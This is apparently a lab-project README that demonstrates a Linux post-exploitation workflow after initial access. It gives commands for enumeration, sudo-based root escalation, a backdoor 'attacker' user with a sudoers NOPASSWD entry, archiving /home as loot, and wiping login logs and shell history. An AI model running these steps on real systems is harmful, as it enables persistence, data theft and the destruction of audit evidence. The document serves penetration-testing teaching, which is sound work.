# Linux Privilege Escalation & Post-Exploitation Project

This project demonstrates a **realistic post-exploitation scenario** on a Linux machine after gaining initial access (e.g., via Metasploit). The goal was to escalate privileges, maintain access, exfiltrate data, and clean up traces â€” using only built-in Linux tools in a **controlled lab environment**.

## ğŸ” Overview

Once access to the target system was obtained (via Metasploit or any other method), I carried out the following steps:
- ğŸ” System Enumeration  
- ğŸ” Privilege Escalation  
- ğŸ› ï¸ Persistence (Backdoor User)  
- ğŸ—ƒï¸ Data Exfiltration  
- ğŸ§¹ Log Cleanup & Anti-Forensics

---

## ğŸš€ Step-by-Step Execution

### ğŸ§  Step 1: Initial System Enumeration

```bash
uname -a
ip a
whoami
env
````

ğŸ“ Purpose: Get OS info, network interfaces, current privileges, and environment variables.

![Host Discovery](screenshots/screen1.png)

---

### ğŸ” Step 2: Checking Sensitive Files

```bash
cat /etc/passwd
cat /etc/shadow
```

> /etc/passwd was readable by the current user.
> Access to /etc/shadow was denied, confirming lack of root access at this stage.
![Host Discovery](screenshots/screen2.png)
---

### ğŸ” Step 3: Search for SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

ğŸ“ These files can be potential vectors for local privilege escalation.
![Host Discovery](screenshots/screen3.png)
---

### ğŸ”‘ Step 4: Sudo Rights Enumeration

```bash
sudo -l
```

The output revealed that the current user had the ability to run all commands as root without a password (NOPASSWD:ALL), which made privilege escalation trivial.
![Host Discovery](screenshots/screen4.png)
---

### ğŸ“ˆ Step 5: Gaining Root Access & Persistence

```bash
sudo su
useradd attacker -m -s /bin/bash
echo 'attacker:password123' | chpasswd
echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

ğŸ“Œ I escalated privileges to root and created a new user attacker with full sudo rights for persistent access.
![Host Discovery](screenshots/screen5.png)
---

### ğŸ’¼ Step 6: Switch to Attacker User and Confirm Privileges

```bash
su - attacker
sudo whoami
```
ğŸ“Œ I verified that the attacker user had root privileges.
Expected Output:

```
root
```

âœ… Root access confirmed through newly added user.
![Host Discovery](screenshots/screen6.png)
---
---

### ğŸ—ƒï¸ Step 7: Data Exfiltration 

```bash
tar -czvf /tmp/loot.tar.gz /home
```

ğŸ“Œ This command compresses all home directory data into a .tar.gz file for potential exfiltration.
![Host Discovery](screenshots/screen7.png)
---

### ğŸ§¹ Step 8: Covering Tracks

```bash
> /var/log/wtmp
> /var/log/btmp
> /root/.bash_history
```

ğŸ“Œ These actions remove evidence of login activity and command history.
![Host Discovery](screenshots/screen8.png)
---

## ğŸ“˜ Real-World Application

This lab demonstrates a realistic post-exploitation workflow after compromising a Linux machine. In real-world penetration testing engagements, such activities are typically used to:

* Validate the **impact of a vulnerability**
* Show **risk to client assets**
* Help **clients understand and fix** weak configurations or poor practices

---

## ğŸ› ï¸ Tools Used

* Metasploit (for initial access)
* Linux terminal utilities (`sudo`, `find`, `tar`, useradd)
* Kali Linux (as a attacker machine)

